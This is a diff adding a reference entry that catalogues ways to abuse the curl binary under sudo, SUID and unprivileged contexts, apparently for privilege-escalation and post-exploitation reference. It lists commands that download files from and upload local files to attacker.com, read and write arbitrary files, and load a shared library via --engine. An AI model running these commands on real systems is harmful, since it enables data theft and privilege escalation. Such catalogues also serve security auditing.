@@ -1,0 +1,86 @@
+curl
+====
+
+Download
+--------
+
+[Sudo]
+    curl http://attacker.com/path/to/input-file -o /path/to/output-file
+
+[SUID]
+    curl http://attacker.com/path/to/input-file -o /path/to/output-file
+
+[Unprivileged]
+    curl http://attacker.com/path/to/input-file -o /path/to/output-file
+
+File read
+---------
+
+[Sudo]
+    curl file:///path/to/input-file
+
+[SUID]
+    curl file:///path/to/input-file
+
+[Unprivileged]
+    curl file:///path/to/input-file
+
+File write
+----------
+
+[Sudo]
+    echo DATA >/path/to/temp-file
+curl file:///path/to/temp-file -o /path/to/output-file
+
+[SUID]
+    echo DATA >/path/to/temp-file
+curl file:///path/to/temp-file -o /path/to/output-file
+
+[Unprivileged]
+    echo DATA >/path/to/temp-file
+curl file:///path/to/temp-file -o /path/to/output-file
+
+Library load
+------------
+
+[Sudo]
+    curl --engine /path/to/lib.so x
+
+[SUID]
+    curl --engine /path/to/lib.so x
+
+[Unprivileged]
+    curl --engine /path/to/lib.so x
+
+Upload
+------
+
+[Sudo]
+    curl -X POST --data-binary @/path/to/input-file http://attacker.com
+
+[SUID]
+    curl -X POST --data-binary @/path/to/input-file http://attacker.com
+
+[Unprivileged]
+    curl -X POST --data-binary @/path/to/input-file http://attacker.com
+
+[Sudo]
+    curl -X POST --data-binary DATA http://attacker.com
+
+[SUID]
+    curl -X POST --data-binary DATA http://attacker.com
+
+[Unprivileged]
+    curl -X POST --data-binary DATA http://attacker.com
+
+[Sudo]
+    curl gopher://attacker.com:12345/_DATA
+    Data will be `\r\n` terminated.
+
+[SUID]
+    curl gopher://attacker.com:12345/_DATA
+    Data will be `\r\n` terminated.
+
+[Unprivileged]
+    curl gopher://attacker.com:12345/_DATA
+    Data will be `\r\n` terminated.
